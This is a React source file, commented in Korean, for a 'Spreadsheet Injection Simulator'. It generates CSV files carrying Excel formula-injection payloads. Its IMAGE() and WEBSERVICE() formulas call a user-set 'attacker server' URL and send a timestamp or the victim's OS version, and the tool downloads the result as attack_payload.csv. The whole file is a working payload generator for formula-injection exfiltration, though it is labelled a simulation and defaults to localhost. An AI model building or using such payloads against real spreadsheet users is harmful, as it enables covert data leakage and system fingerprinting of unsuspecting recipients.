// cvs + formula injection 공격 생성기 

import { useState } from "react";

export default function SpreadsheetSimulator() {
  const [serverUrl, setServerUrl] = useState("http://localhost:4000/collect");
  const [payloadType, setPayloadType] = useState("image");

  const buildFormula = () => {
    if (payloadType === "image") {
      return `=IMAGE("${serverUrl}?ts=" & TEXT(NOW(),"yyyymmddhhmmss"))`;
    }

    if (payloadType === "webservice") {
      return `=WEBSERVICE("${serverUrl}?os=" & INFO("osversion"))`;
    }

    return "";
  };

  const generateCSV = () => {
    const formula = buildFormula();

    const csvContent = `"username","email","status"\n"victim","victim@test.com","${formula}"`;

    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "attack_payload.csv";
    a.click();
  };

  return (
    <div style={{ width: "100%", padding: "16px" }}>
      <h2>🧪 Spreadsheet Injection Simulator</h2>
      <p style={{ color: "#666" }}>
        Excel의 WEBSERVICE() 또는 IMAGE() 함수를 이용한 exfiltration 공격을 시뮬레이션합니다.
      </p>

      <div style={{ marginTop: "12px" }}>
        <label>📡 공격자 서버 URL</label>
        <input
          type="text"
          value={serverUrl}
          onChange={(e) => setServerUrl(e.target.value)}
          style={{ width: "100%", padding: "8px", marginTop: "4px" }}
        />
      </div>

      <div style={{ marginTop: "12px" }}>
        <label>⚙️ Payload Type</label>
        <select
          value={payloadType}
          onChange={(e) => setPayloadType(e.target.value)}
          style={{ padding: "8px", marginLeft: "10px" }}
        >
          <option value="image">IMAGE() exfiltration</option>
          <option value="webservice">WEBSERVICE() exfiltration</option>
        </select>
      </div>

      <div style={{ marginTop: "20px" }}>
        <h3>📄 공격 Formula Preview</h3>
        <pre
          style={{
            background: "#f3f3f3",
            padding: "10px",
            borderRadius: "6px",
          }}
        >
          {buildFormula()}
        </pre>
      </div>

      <button
        onClick={generateCSV}
        style={{
          marginTop: "20px",
          padding: "10px 14px",
          background: "#1976d2",
          color: "white",
          borderRadius: "6px",
          cursor: "pointer",
        }}
      >
        📥 공격 CSV 다운로드
      </button>
    </div>
  );
}
